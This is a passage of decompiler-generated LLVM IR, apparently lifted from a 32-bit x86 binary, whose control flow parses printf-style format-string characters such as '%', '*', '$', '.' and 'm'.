  %v2_805c5ac = and i32 %v1_805c5aa, %v0_805c5a1
  store i32 %v2_805c5ac, i32* %edi.global-to-local, align 4
  %v1_805c5ae = add i32 %v0_805c5ae, -1
  %v2_805c5ae = inttoptr i32 %v1_805c5ae to i8*
  %v3_805c5ae = load i8, i8* %v2_805c5ae, align 1
  %v12_805c5ae = icmp eq i8 %v3_805c5ae, 37
  %v1_805c5b2 = icmp eq i1 %v12_805c5ae, false
  br i1 %v1_805c5b2, label %dec_label_pc_805c4e4, label %dec_label_pc_805c5b8

dec_label_pc_805c5b8:                             ; preds = %dec_label_pc_805c573, %dec_label_pc_805c5a1, %dec_label_pc_805c521, %dec_label_pc_805c566
  %v0_805c5db = phi i32 [ %v1_805c50d, %dec_label_pc_805c566 ], [ %v1_805c50d, %dec_label_pc_805c573 ], [ 0, %dec_label_pc_805c5a1 ], [ %v1_805c50d, %dec_label_pc_805c521 ]
  %v1_805c5e4 = phi i32 [ %v0_805c514, %dec_label_pc_805c566 ], [ %v0_805c514, %dec_label_pc_805c573 ], [ %v0_805c5ae, %dec_label_pc_805c5a1 ], [ %v0_805c514, %dec_label_pc_805c521 ]
  %v0_805c5e1 = phi i32 [ %v0_805c521, %dec_label_pc_805c566 ], [ %v0_805c521, %dec_label_pc_805c573 ], [ %v1_805c58e, %dec_label_pc_805c5a1 ], [ %v0_805c521, %dec_label_pc_805c521 ]
  %stack_var_-32.3 = phi i32 [ %stack_var_-32.1, %dec_label_pc_805c566 ], [ %stack_var_-32.1, %dec_label_pc_805c573 ], [ %stack_var_-32.2, %dec_label_pc_805c5a1 ], [ %stack_var_-32.1, %dec_label_pc_805c521 ]
  %stack_var_-88.3 = phi i32 [ %stack_var_-88.1, %dec_label_pc_805c566 ], [ 0, %dec_label_pc_805c573 ], [ %stack_var_-88.2, %dec_label_pc_805c5a1 ], [ %stack_var_-88.1, %dec_label_pc_805c521 ]
  %v1_805c5b8 = inttoptr i32 %v0_805c5e1 to i8*
  %v2_805c5b8 = load i8, i8* %v1_805c5b8, align 1
  %v11_805c5b8 = icmp eq i8 %v2_805c5b8, 42
  %v1_805c5bb = icmp eq i1 %v11_805c5b8, false
  br i1 %v1_805c5bb, label %dec_label_pc_805c5f1, label %dec_label_pc_805c5bd

dec_label_pc_805c5bd:                             ; preds = %dec_label_pc_805c5b8
  %v4_805c5bd = icmp eq i32 %stack_var_-88.3, 0
  br i1 %v4_805c5bd, label %dec_label_pc_805c5e1, label %dec_label_pc_805c5c4

dec_label_pc_805c5c4:                             ; preds = %dec_label_pc_805c5bd
  %v1_805c5c4 = inttoptr i32 %v1_805c5e4 to i8*
  %v2_805c5c4 = load i8, i8* %v1_805c5c4, align 1
  %v11_805c5c4 = icmp eq i8 %v2_805c5c4, 36
  %v1_805c5c7 = icmp eq i1 %v11_805c5c4, false
  br i1 %v1_805c5c7, label %dec_label_pc_805c800, label %dec_label_pc_805c5cd

dec_label_pc_805c5cd:                             ; preds = %dec_label_pc_805c5c4
  %tmp91 = icmp slt i32 %v0_805c5db, 1
  br i1 %tmp91, label %dec_label_pc_805c800, label %dec_label_pc_805c5d5

dec_label_pc_805c5d5:                             ; preds = %dec_label_pc_805c5cd
  store i32 %v8_805c4eb, i32* %eax.global-to-local, align 4
  %v1_805c5da = add i32 %v1_805c5e4, 1
  store i32 %v1_805c5da, i32* @esi, align 4
  %v1_805c5db = load i32, i32* @esp, align 4
  %v3_805c5db = add i32 %v8_805c4eb, 68
  %v4_805c5db = add i32 %v3_805c5db, %v1_805c5db
  %v5_805c5db = inttoptr i32 %v4_805c5db to i32*
  store i32 %v0_805c5db, i32* %v5_805c5db, align 4
  %v0_805c61f.pre.pre.pre.pre = load i32, i32* @esi, align 4
  br label %dec_label_pc_805c5ec

dec_label_pc_805c5e1:                             ; preds = %dec_label_pc_805c5bd
  %v1_805c5e1 = add i32 %v0_805c5e1, 1
  store i32 %v1_805c5e1, i32* %eax.global-to-local, align 4
  %v12_805c5e4 = icmp eq i32 %v1_805c5e1, %v1_805c5e4
  %v1_805c5e6 = icmp eq i1 %v12_805c5e4, false
  br i1 %v1_805c5e6, label %dec_label_pc_805c800, label %dec_label_pc_805c5ec

dec_label_pc_805c5ec:                             ; preds = %dec_label_pc_805c5e1, %dec_label_pc_805c5d5
  %v0_805c61f.pre.pre.pre = phi i32 [ %v1_805c5e4, %dec_label_pc_805c5e1 ], [ %v0_805c61f.pre.pre.pre.pre, %dec_label_pc_805c5d5 ]
  store i32 -2147483648, i32* %ebx.global-to-local, align 4
  br label %dec_label_pc_805c5f1

dec_label_pc_805c5f1:                             ; preds = %dec_label_pc_805c5b8, %dec_label_pc_805c5ec
  %v0_805c61f.pre.pre = phi i32 [ %v1_805c5e4, %dec_label_pc_805c5b8 ], [ %v0_805c61f.pre.pre.pre, %dec_label_pc_805c5ec ]
  %v0_805c48a = phi i32 [ %v0_805c5db, %dec_label_pc_805c5b8 ], [ -2147483648, %dec_label_pc_805c5ec ]
  %v4_805c5f1 = trunc i64 %stack_var_-92.1.ph to i32
  %v5_805c5f1 = icmp eq i32 %v4_805c5f1, 0
  %v1_805c5f6 = icmp eq i1 %v5_805c5f1, false
  %.pre = inttoptr i32 %v0_805c61f.pre.pre to i8*
  br i1 %v1_805c5f6, label %dec_label_pc_805c61a, label %dec_label_pc_805c5fc

dec_label_pc_805c5fc:                             ; preds = %dec_label_pc_805c5f1
  %v2_805c5fc = load i8, i8* %.pre, align 1
  %v11_805c5fc = icmp eq i8 %v2_805c5fc, 46
  %v1_805c5ff = icmp eq i1 %v11_805c5fc, false
  br i1 %v1_805c5ff, label %dec_label_pc_805c613, label %dec_label_pc_805c601

dec_label_pc_805c601:                             ; preds = %dec_label_pc_805c5fc
  %v1_805c601 = add i32 %v0_805c61f.pre.pre, 1
  store i32 %v1_805c601, i32* %esi.global-to-local, align 4
  br label %dec_label_pc_805c4e4.outer

dec_label_pc_805c613:                             ; preds = %dec_label_pc_805c5fc
  br label %dec_label_pc_805c61a

dec_label_pc_805c61a:                             ; preds = %dec_label_pc_805c5f1, %dec_label_pc_805c613
  %stack_var_-96.2 = phi i32 [ %v0_805c48a, %dec_label_pc_805c613 ], [ %stack_var_-96.1.ph, %dec_label_pc_805c5f1 ]
  %storemerge4 = phi i32 [ -1, %dec_label_pc_805c613 ], [ %v0_805c48a, %dec_label_pc_805c5f1 ]
  store i32 %storemerge4, i32* %ebp.global-to-local, align 4
  store i32 ptrtoint ([9 x i8]* @global_var_806cb2c.707 to i32), i32* @edx, align 4
  %v4_805c61f.pre = load i32, i32* %eax.global-to-local, align 4
  br label %dec_label_pc_805c61f

dec_label_pc_805c61f:                             ; preds = %dec_label_pc_805c629, %dec_label_pc_805c61a
  %v0_805c629 = phi i32 [ %v1_805c629, %dec_label_pc_805c629 ], [ ptrtoint ([9 x i8]* @global_var_806cb2c.707 to i32), %dec_label_pc_805c61a ]
  %v4_805c61f = phi i32 [ %v6_805c61f, %dec_label_pc_805c629 ], [ %v4_805c61f.pre, %dec_label_pc_805c61a ]
  %v2_805c61f = load i8, i8* %.pre, align 1
  %v3_805c61f = zext i8 %v2_805c61f to i32
  %v5_805c61f = and i32 %v4_805c61f, -256
  %v6_805c61f = or i32 %v3_805c61f, %v5_805c61f
  store i32 %v6_805c61f, i32* %eax.global-to-local, align 4
  %v3_805c621 = inttoptr i32 %v0_805c629 to i8*
  %v4_805c621 = load i8, i8* %v3_805c621, align 1
  %v15_805c621 = icmp eq i8 %v2_805c61f, %v4_805c621
  br i1 %v15_805c621, label %dec_label_pc_805c491, label %dec_label_pc_805c629

dec_label_pc_805c629:                             ; preds = %dec_label_pc_805c61f
  %v1_805c629 = add i32 %v0_805c629, 1
  store i32 %v1_805c629, i32* @edx, align 4
  %v1_805c62a = inttoptr i32 %v1_805c629 to i8*
  %v2_805c62a = load i8, i8* %v1_805c62a, align 1
  %v3_805c62a = icmp eq i8 %v2_805c62a, 0
  %v1_805c62d = icmp eq i1 %v3_805c62a, false
  br i1 %v1_805c62d, label %dec_label_pc_805c61f, label %dec_label_pc_805c62f

dec_label_pc_805c62f:                             ; preds = %dec_label_pc_805c629, %dec_label_pc_805c491
  %v0_805c642 = phi i32 [ %v1_805c491, %dec_label_pc_805c491 ], [ %v0_805c61f.pre.pre, %dec_label_pc_805c629 ]
  %v0_805c63f = phi i32 [ %v0_805c629, %dec_label_pc_805c491 ], [ %v1_805c629, %dec_label_pc_805c629 ]
  %v1_805c631 = add i32 %v0_805c63f, -134662956
  %v1_805c636 = add i32 %v0_805c63f, -134662957
  %v5_805c636 = sub i32 134662956, %v0_805c63f
  %v6_805c636 = and i32 %v1_805c631, %v5_805c636
  %v7_805c636 = icmp slt i32 %v6_805c636, 0
  %v8_805c636 = icmp eq i32 %v1_805c636, 0
  %v9_805c636 = icmp slt i32 %v1_805c636, 0
  store i32 %v1_805c636, i32* %eax.global-to-local, align 4
  %v3_805c637 = icmp eq i1 %v9_805c636, %v7_805c636
  %v4_805c637 = icmp eq i1 %v8_805c636, false
  %v5_805c637 = and i1 %v4_805c637, %v3_805c637
  br i1 %v5_805c637, label %dec_label_pc_805c643, label %dec_label_pc_805c639

dec_label_pc_805c639:                             ; preds = %dec_label_pc_805c62f
  %v1_805c639 = inttoptr i32 %v0_805c642 to i8*
  %v2_805c639 = load i8, i8* %v1_805c639, align 1
  %v3_805c639 = zext i8 %v2_805c639 to i32
  %v5_805c639 = and i32 %v1_805c636, -256
  %v6_805c639 = or i32 %v3_805c639, %v5_805c639
  store i32 %v6_805c639, i32* %eax.global-to-local, align 4
  %v3_805c63b = inttoptr i32 %v0_805c63f to i8*
  %v4_805c63b = load i8, i8* %v3_805c63b, align 1
  %v15_805c63b = icmp eq i8 %v2_805c639, %v4_805c63b
  %v1_805c63d = icmp eq i1 %v15_805c63b, false
  br i1 %v1_805c63d, label %dec_label_pc_805c643, label %dec_label_pc_805c63f

dec_label_pc_805c63f:                             ; preds = %dec_label_pc_805c639
  %v1_805c63f = add i32 %v0_805c63f, 9
  store i32 %v1_805c63f, i32* @edx, align 4
  %v1_805c642 = add i32 %v0_805c642, 1
  store i32 %v1_805c642, i32* @esi, align 4
  br label %dec_label_pc_805c643

dec_label_pc_805c643:                             ; preds = %dec_label_pc_805c639, %dec_label_pc_805c62f, %dec_label_pc_805c63f
  %v4_805c64a = phi i32 [ %v6_805c639, %dec_label_pc_805c639 ], [ %v1_805c636, %dec_label_pc_805c62f ], [ %v6_805c639, %dec_label_pc_805c63f ]
  %v0_805c64a = phi i32 [ %v0_805c642, %dec_label_pc_805c639 ], [ %v0_805c642, %dec_label_pc_805c62f ], [ %v1_805c642, %dec_label_pc_805c63f ]
  %v0_805c643 = phi i32 [ %v0_805c63f, %dec_label_pc_805c639 ], [ %v0_805c63f, %dec_label_pc_805c62f ], [ %v1_805c63f, %dec_label_pc_805c63f ]
  %v1_805c643 = add i32 %v0_805c643, 9
  %v2_805c643 = inttoptr i32 %v1_805c643 to i8*
  %v3_805c643 = load i8, i8* %v2_805c643, align 1
  %v4_805c643 = sext i8 %v3_805c643 to i32
  %v2_805c647 = mul nsw i32 %v4_805c643, 256
  store i32 %v2_805c647, i32* %ebx.global-to-local, align 4
  %v1_805c64a = inttoptr i32 %v0_805c64a to i8*
  %v2_805c64a = load i8, i8* %v1_805c64a, align 1
  %v3_805c64a = zext i8 %v2_805c64a to i32
  %v5_805c64a = and i32 %v4_805c64a, -256
  %v6_805c64a = or i32 %v3_805c64a, %v5_805c64a
  store i32 %v6_805c64a, i32* %eax.global-to-local, align 4
  %v4_805c64c = icmp eq i8 %v2_805c64a, 0
  br i1 %v4_805c64c, label %dec_label_pc_805c800, label %dec_label_pc_805c654

dec_label_pc_805c654:                             ; preds = %dec_label_pc_805c643
  store i32 ptrtoint ([21 x i8]* @global_var_806cb69.708 to i32), i32* %ecx.global-to-local, align 4
  %v3_805c659 = load i32, i32* %stack_var_-20, align 4
  store i32 %v3_805c659, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805c65d

dec_label_pc_805c65d:                             ; preds = %dec_label_pc_805c6ac, %dec_label_pc_805c654
  %v0_805c6ac = phi i32 [ %v1_805c6ac, %dec_label_pc_805c6ac ], [ ptrtoint ([21 x i8]* @global_var_806cb69.708 to i32), %dec_label_pc_805c654 ]
  %v3_805c65d = inttoptr i32 %v0_805c6ac to i8*
  %v4_805c65d = load i8, i8* %v3_805c65d, align 1
  %v15_805c65d = icmp eq i8 %v2_805c64a, %v4_805c65d
  %v1_805c65f = icmp eq i1 %v15_805c65d, false
  br i1 %v1_805c65f, label %dec_label_pc_805c6ac, label %dec_label_pc_805c661

dec_label_pc_805c661:                             ; preds = %dec_label_pc_805c65d
  %v1_805c663 = add i32 %v0_805c6ac, -134663017
  store i32 %v1_805c663, i32* %edx.global-to-local, align 4
  %v7_805c66c = icmp sgt i32 %v1_805c663, 17
  br i1 %v7_805c66c, label %dec_label_pc_805c66e, label %dec_label_pc_805c676

dec_label_pc_805c66e:                             ; preds = %dec_label_pc_805c661
  %v3_805c66e = and i32 %v2_805c647, 1024
  %v4_805c66e = icmp eq i32 %v3_805c66e, 0
  br i1 %v4_805c66e, label %dec_label_pc_805c676, label %dec_label_pc_805c673

dec_label_pc_805c673:                             ; preds = %dec_label_pc_805c66e
  %v1_805c673 = add i32 %v0_805c6ac, -134663019
  store i32 %v1_805c673, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805c676

dec_label_pc_805c676:                             ; preds = %dec_label_pc_805c661, %dec_label_pc_805c66e, %dec_label_pc_805c673
  %v0_805c67f = phi i32 [ %v1_805c663, %dec_label_pc_805c661 ], [ %v1_805c663, %dec_label_pc_805c66e ], [ %v1_805c673, %dec_label_pc_805c673 ]
  store i32 %tmp76, i32* %eax.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_806cb5f.709 to i32), i32* %ecx.global-to-local, align 4
  %v2_805c67f = add i32 %tmp76, 32
  %v3_805c67f = inttoptr i32 %v2_805c67f to i32*
  store i32 %v0_805c67f, i32* %v3_805c67f, align 4
  %v0_805c682.pre = load i32, i32* %ecx.global-to-local, align 4
  %v0_805c686.pre = load i32, i32* %edx.global-to-local, align 4
  br label %dec_label_pc_805c682

dec_label_pc_805c682:                             ; preds = %dec_label_pc_805c682, %dec_label_pc_805c676
  %v0_805c682 = phi i32 [ %v1_805c682, %dec_label_pc_805c682 ], [ %v0_805c682.pre, %dec_label_pc_805c676 ]
  %v1_805c682 = add i32 %v0_805c682, 1
  store i32 %v1_805c682, i32* %ecx.global-to-local, align 4
  %v1_805c683 = inttoptr i32 %v1_805c682 to i8*
  %v2_805c683 = load i8, i8* %v1_805c683, align 1
  %v3_805c683 = sext i8 %v2_805c683 to i32
  store i32 %v3_805c683, i32* %eax.global-to-local, align 4
  %v8_805c688 = icmp sgt i32 %v0_805c686.pre, %v3_805c683
  br i1 %v8_805c688, label %dec_label_pc_805c682, label %dec_label_pc_805c68a

dec_label_pc_805c68a:                             ; preds = %dec_label_pc_805c682
  store i32 ptrtoint ([21 x i8]* @global_var_806cb69.708 to i32), i32* @ecx, align 4
  %v1_805c691 = add i32 %v0_805c682, -134663007
  store i32 %v1_805c691, i32* %eax.global-to-local, align 4
  %v2_805c696 = add i32 %v0_805c682, add (i32 ptrtoint (i32* @global_var_806cb50.710 to i32), i32 -134663007)
  %v3_805c696 = add i32 %v2_805c696, %v1_805c691
  %v4_805c696 = inttoptr i32 %v3_805c696 to i16*
  %v5_805c696 = load i16, i16* %v4_805c696, align 2
  %v6_805c696 = sext i16 %v5_805c696 to i32
  store i32 %v6_805c696, i32* %edx.global-to-local, align 4
  %factor = mul i32 %v1_805c691, 2
  %v3_805c69e = add i32 %factor, 134662976
  %v4_805c69e = inttoptr i32 %v3_805c69e to i16*
  %v5_805c69e = load i16, i16* %v4_805c69e, align 2
  %v6_805c69e = sext i16 %v5_805c69e to i32
  store i32 %v6_805c69e, i32* %eax.global-to-local, align 4
  %v1_805c6a6 = load i32, i32* %ebx.global-to-local, align 4
  %v2_805c6a6 = or i32 %v1_805c6a6, %v6_805c696
  %v2_805c6a8 = and i32 %v2_805c6a6, %v6_805c69e
  store i32 %v2_805c6a8, i32* %edx.global-to-local, align 4
  %v0_805c6ba.pre = load i32, i32* @esi, align 4
  %v0_805c6bd.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805c6b2

dec_label_pc_805c6ac:                             ; preds = %dec_label_pc_805c65d
  %v1_805c6ac = add i32 %v0_805c6ac, 1
  store i32 %v1_805c6ac, i32* @ecx, align 4
  %v1_805c6ad = inttoptr i32 %v1_805c6ac to i8*
  %v2_805c6ad = load i8, i8* %v1_805c6ad, align 1
  %v3_805c6ad = icmp eq i8 %v2_805c6ad, 0
  %v1_805c6b0 = icmp eq i1 %v3_805c6ad, false
  br i1 %v1_805c6b0, label %dec_label_pc_805c65d, label %dec_label_pc_805c6b2

dec_label_pc_805c6b2:                             ; preds = %dec_label_pc_805c6ac, %dec_label_pc_805c68a
  %v0_805c6bd = phi i32 [ %v0_805c6bd.pre, %dec_label_pc_805c68a ], [ %storemerge4, %dec_label_pc_805c6ac ]
  %v0_805c6ba = phi i32 [ %v0_805c6ba.pre, %dec_label_pc_805c68a ], [ %v0_805c64a, %dec_label_pc_805c6ac ]
  %v0_805c6b2 = phi i32 [ %v2_805c6a8, %dec_label_pc_805c68a ], [ %v3_805c659, %dec_label_pc_805c6ac ]
  store i32 %v0_805c6b2, i32* %stack_var_-20, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v1_805c6ba = inttoptr i32 %v0_805c6ba to i8*
  %v2_805c6ba = load i8, i8* %v1_805c6ba, align 1
  %v3_805c6ba = sext i8 %v2_805c6ba to i32
  store i32 %v3_805c6ba, i32* %eax.global-to-local, align 4
  %v2_805c6bd = add i32 %tmp76, 4
  %v3_805c6bd = inttoptr i32 %v2_805c6bd to i32*
  store i32 %v0_805c6bd, i32* %v3_805c6bd, align 4
  %v0_805c6c0 = load i32, i32* %eax.global-to-local, align 4
  %v1_805c6c0 = load i32, i32* @edx, align 4
  %v2_805c6c0 = add i32 %v1_805c6c0, 12
  %v3_805c6c0 = inttoptr i32 %v2_805c6c0 to i32*
  store i32 %v0_805c6c0, i32* %v3_805c6c0, align 4
  store i32 %stack_var_-96.2, i32* %eax.global-to-local, align 4
  %v0_805c6c7 = load i32, i32* @edx, align 4
  %v1_805c6c7 = add i32 %v0_805c6c7, 28
  %v2_805c6c7 = inttoptr i32 %v1_805c6c7 to i32*
  store i32 1, i32* %v2_805c6c7, align 4
  %v0_805c6ce = load i32, i32* %eax.global-to-local, align 4
  %v1_805c6ce = load i32, i32* @edx, align 4
  %v2_805c6ce = add i32 %v1_805c6ce, 8
  %v3_805c6ce = inttoptr i32 %v2_805c6ce to i32*
  store i32 %v0_805c6ce, i32* %v3_805c6ce, align 4
  %v0_805c6d1 = load i32, i32* %edi.global-to-local, align 4
  %v1_805c6db = and i32 %v0_805c6d1, -5
  %v0_805c6e1 = load i32, i32* %ebx.global-to-local, align 4
  %v1_805c6e1 = and i32 %v0_805c6e1, 3840
  store i32 %v1_805c6e1, i32* %ebx.global-to-local, align 4
  store i32 48, i32* %eax.global-to-local, align 4
  %v2_805c6ea = or i32 %v1_805c6e1, %v1_805c6db
  store i32 %v2_805c6ea, i32* @edi, align 4
  %v1_805c6ec = load i32, i32* @edx, align 4
  %v2_805c6ec = add i32 %v1_805c6ec, 20
  %v3_805c6ec = inttoptr i32 %v2_805c6ec to i32*
  store i32 48, i32* %v3_805c6ec, align 4
  %v0_805c6ef = load i32, i32* @edi, align 4
  %v1_805c6ef = load i32, i32* @edx, align 4
  %v2_805c6ef = add i32 %v1_805c6ef, 16
  %v3_805c6ef = inttoptr i32 %v2_805c6ef to i32*
  store i32 %v0_805c6ef, i32* %v3_805c6ef, align 4
  %v0_805c6f2 = load i32, i32* @ecx, align 4
  %v1_805c6f2 = inttoptr i32 %v0_805c6f2 to i8*
  %v2_805c6f2 = load i8, i8* %v1_805c6f2, align 1
  %v3_805c6f2 = icmp eq i8 %v2_805c6f2, 0
  %v1_805c6f5 = icmp eq i1 %v3_805c6f2, false
  br i1 %v1_805c6f5, label %dec_label_pc_805c70e, label %dec_label_pc_805c6f7

dec_label_pc_805c6f7:                             ; preds = %dec_label_pc_805c6b2
  %v0_805c6f7 = load i32, i32* @esi, align 4
  %v1_805c6f7 = inttoptr i32 %v0_805c6f7 to i8*
  %v2_805c6f7 = load i8, i8* %v1_805c6f7, align 1
  %v11_805c6f7 = icmp eq i8 %v2_805c6f7, 109
  %v1_805c6fa = icmp eq i1 %v11_805c6f7, false
  br i1 %v1_805c6fa, label %dec_label_pc_805c800, label %dec_label_pc_805c700

dec_label_pc_805c700:                             ; preds = %dec_label_pc_805c6f7
  %v0_805c700 = load i32, i32* @edx, align 4
  %v1_805c700 = add i32 %v0_805c700, 32
  %v2_805c700 = inttoptr i32 %v1_805c700 to i32*
  store i32 20, i32* %v2_805c700, align 4
  %v0_805c707 = load i32, i32* @edx, align 4
  %v1_805c707 = add i32 %v0_805c707, 28
  %v2_805c707 = inttoptr i32 %v1_805c707 to i32*
  store i32 0, i32* %v2_805c707, align 4
  br label %dec_label_pc_805c70e

dec_label_pc_805c70e:                             ; preds = %dec_label_pc_805c6b2, %dec_label_pc_805c700
  %tmp92 = icmp slt i32 %stack_var_-88.3, 1
  br i1 %tmp92, label %dec_label_pc_805c7a2, label %dec_label_pc_805c719

dec_label_pc_805c719:                             ; preds = %dec_label_pc_805c70e
  store i32 0, i32* %ebp.global-to-local, align 4
  %v3_805c75a = add i32 %tmp76, 40
  %v1_805c793 = add i32 %tmp76, 28
  %v2_805c793 = inttoptr i32 %v1_805c793 to i32*
  %v4_805c728 = add i32 %tmp76, 36
  br label %dec_label_pc_805c71b

dec_label_pc_805c71b:                             ; preds = %dec_label_pc_805c78e, %dec_label_pc_805c719
  %v0_805c731 = phi i32 [ 0, %dec_label_pc_805c719 ], [ %v1_805c792, %dec_label_pc_805c78e ]
  %stack_var_-88.4 = phi i32 [ %stack_var_-88.3, %dec_label_pc_805c719 ], [ %stack_var_-88.5, %dec_label_pc_805c78e ]
  %v1_805c71b = add i32 %v0_805c731, -2
  %v6_805c71b = sub i32 1, %v0_805c731
  %v7_805c71b = and i32 %v6_805c71b, %v0_805c731
  %v8_805c71b = icmp slt i32 %v7_805c71b, 0
  %v9_805c71b = icmp eq i32 %v1_805c71b, 0
  %v10_805c71b = icmp slt i32 %v1_805c71b, 0
  %v3_805c71e = icmp eq i1 %v10_805c71b, %v8_805c71b
  %v4_805c71e = icmp eq i1 %v9_805c71b, false
  %v5_805c71e = and i1 %v4_805c71e, %v3_805c71e
  br i1 %v5_805c71e, label %dec_label_pc_805c731, label %dec_label_pc_805c720

dec_label_pc_805c720:                             ; preds = %dec_label_pc_805c71b
  store i32 %tmp76, i32* @edx, align 4
  %v0_805c724 = load i32, i32* @esp, align 4
  %v2_805c724 = mul i32 %v0_805c731, 4
  %v3_805c724 = add i32 %v2_805c724, 68
  %v4_805c724 = add i32 %v3_805c724, %v0_805c724
  %v5_805c724 = inttoptr i32 %v4_805c724 to i32*
  %v6_805c724 = load i32, i32* %v5_805c724, align 4
  store i32 %v6_805c724, i32* %eax.global-to-local, align 4
  %v1_805c728 = trunc i32 %v6_805c724 to i8
  %v5_805c728 = add i32 %v4_805c728, %v0_805c731
  %v6_805c728 = inttoptr i32 %v5_805c728 to i8*
  store i8 %v1_805c728, i8* %v6_805c728, align 1
  %v0_805c72c = load i32, i32* %eax.global-to-local, align 4
  %v1_805c72c = urem i32 %v0_805c72c, 256
  br label %dec_label_pc_805c73a

dec_label_pc_805c731:                             ; preds = %dec_label_pc_805c71b
  %v5_805c733 = add i32 %v0_805c731, %stack_var_-32.3
  store i32 %v5_805c733, i32* %eax.global-to-local, align 4
  %v1_805c737 = add i32 %v5_805c733, -2
  br label %dec_label_pc_805c73a

dec_label_pc_805c73a:                             ; preds = %dec_label_pc_805c720, %dec_label_pc_805c731
  %v0_805c74d = phi i32 [ %v1_805c72c, %dec_label_pc_805c720 ], [ %v1_805c737, %dec_label_pc_805c731 ]
  store i32 %v0_805c74d, i32* %eax.global-to-local, align 4
  %v5_805c73a = sub i32 %v0_805c74d, %stack_var_-88.4
  %v11_805c73a = xor i32 %v0_805c74d, %stack_var_-88.4
  %v12_805c73a = xor i32 %v5_805c73a, %v0_805c74d
  %v13_805c73a = and i32 %v12_805c73a, %v11_805c73a
  %v14_805c73a = icmp slt i32 %v13_805c73a, 0
  %v15_805c73a = icmp eq i32 %v5_805c73a, 0
  %v16_805c73a = icmp slt i32 %v5_805c73a, 0
  %v3_805c73e = icmp ne i1 %v16_805c73a, %v14_805c73a
  %v4_805c73e = or i1 %v15_805c73a, %v3_805c73e
  br i1 %v4_805c73e, label %dec_label_pc_805c74d, label %dec_label_pc_805c740

dec_label_pc_805c740:                             ; preds = %dec_label_pc_805c73a
  %v1_805c740 = add i32 %v0_805c74d, -9
  %v6_805c740 = sub i32 8, %v0_805c74d
  %v7_805c740 = and i32 %v6_805c740, %v0_805c74d
  %v8_805c740 = icmp slt i32 %v7_805c740, 0
  %v9_805c740 = icmp eq i32 %v1_805c740, 0
  %v10_805c740 = icmp slt i32 %v1_805c740, 0
  %v3_805c743 = icmp eq i1 %v10_805c740, %v8_805c740
  %v4_805c743 = icmp eq i1 %v9_805c740, false
  %v5_805c743 = and i1 %v4_805c743, %v3_805c743
  br i1 %v5_805c743, label %dec_label_pc_805c800, label %dec_label_pc_805c74d

dec_label_pc_805c74d:                             ; preds = %dec_label_pc_805c740, %dec_label_pc_805c73a
  %stack_var_-88.5 = phi i32 [ %stack_var_-88.4, %dec_label_pc_805c73a ], [ %v0_805c74d, %dec_label_pc_805c740 ]
  %v1_805c74d = add i32 %v0_805c74d, -1
  store i32 %v1_805c74d, i32* %eax.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v0_805c756 = load i32, i32* @esp, align 4
  %v1_805c756 = load i32, i32* %ebp.global-to-local, align 4
  %v2_805c756 = mul i32 %v1_805c756, 4
  %v3_805c756 = add i32 %v0_805c756, 80
  %v4_805c756 = add i32 %v3_805c756, %v2_805c756
  %v5_805c756 = inttoptr i32 %v4_805c756 to i32*
  %v6_805c756 = load i32, i32* %v5_805c756, align 4
  store i32 %v6_805c756, i32* %edi.global-to-local, align 4
  %v2_805c75a = mul i32 %v1_805c74d, 4
  %v4_805c75a = add i32 %v3_805c75a, %v2_805c75a
  %v5_805c75a = inttoptr i32 %v4_805c75a to i32*
  %v6_805c75a = load i32, i32* %v5_805c75a, align 4
  store i32 %v6_805c75a, i32* @eax, align 4
  %v9_805c75e = icmp eq i32 %v6_805c756, 8
  br i1 %v9_805c75e, label %dec_label_pc_805c78e, label %dec_label_pc_805c763

dec_label_pc_805c763:                             ; preds = %dec_label_pc_805c74d
  %v9_805c763 = icmp eq i32 %v6_805c75a, 8
  br i1 %v9_805c763, label %dec_label_pc_805c77e, label %dec_label_pc_805c768

dec_label_pc_805c768:                             ; preds = %dec_label_pc_805c763
  %v12_805c768 = icmp eq i32 %v6_805c75a, %v6_805c756
  br i1 %v12_805c768, label %dec_label_pc_805c77e, label %dec_label_pc_805c76c

dec_label_pc_805c76c:                             ; preds = %dec_label_pc_805c768
  %v1_805c76c = call i32 @_promoted_size(i32 %v1_805c74d)
  store i32 %v1_805c76c, i32* %ebx.global-to-local, align 4
  %v0_805c773 = load i32, i32* %edi.global-to-local, align 4
  store i32 %v0_805c773, i32* @eax, align 4
  %v1_805c775 = call i32 @_promoted_size(i32 %v1_805c74d)
  store i32 %v1_805c775, i32* %eax.global-to-local, align 4
  %v8_805c77c = icmp sgt i32 %v1_805c76c, %v1_805c775
  br i1 %v8_805c77c, label %dec_label_pc_805c78e, label %dec_label_pc_805c76c.dec_label_pc_805c77e_crit_edge

dec_label_pc_805c76c.dec_label_pc_805c77e_crit_edge: ; preds = %dec_label_pc_805c76c
  %v0_805c786.pre = load i32, i32* @esp, align 4
  %v1_805c786.pre = load i32, i32* %ebp.global-to-local, align 4
  br label %dec_label_pc_805c77e

dec_label_pc_805c77e:                             ; preds = %dec_label_pc_805c76c.dec_label_pc_805c77e_crit_edge, %dec_label_pc_805c768, %dec_label_pc_805c763
  %v1_805c786 = phi i32 [ %v1_805c786.pre, %dec_label_pc_805c76c.dec_label_pc_805c77e_crit_edge ], [ %v1_805c756, %dec_label_pc_805c768 ], [ %v1_805c756, %dec_label_pc_805c763 ]
  %v0_805c786 = phi i32 [ %v0_805c786.pre, %dec_label_pc_805c76c.dec_label_pc_805c77e_crit_edge ], [ %v0_805c756, %dec_label_pc_805c768 ], [ %v0_805c756, %dec_label_pc_805c763 ]
  store i32 %v1_805c74d, i32* %ecx.global-to-local, align 4
  store i32 %tmp76, i32* @edx, align 4
  %v2_805c786 = mul i32 %v1_805c786, 4
  %v3_805c786 = add i32 %v0_805c786, 80
  %v4_805c786 = add i32 %v3_805c786, %v2_805c786
  %v5_805c786 = inttoptr i32 %v4_805c786 to i32*
  %v6_805c786 = load i32, i32* %v5_805c786, align 4
  store i32 %v6_805c786, i32* %eax.global-to-local, align 4
  store i32 %v6_805c786, i32* %v5_805c75a, align 4
  br label %dec_label_pc_805c78e

dec_label_pc_805c78e:                             ; preds = %dec_label_pc_805c76c, %dec_label_pc_805c74d, %dec_label_pc_805c77e
  store i32 %tmp76, i32* @ecx, align 4
  %v0_805c792 = load i32, i32* %ebp.global-to-local, align 4
  %v1_805c792 = add i32 %v0_805c792, 1
  store i32 %v1_805c792, i32* %ebp.global-to-local, align 4
  %v3_805c793 = load i32, i32* %v2_805c793, align 4
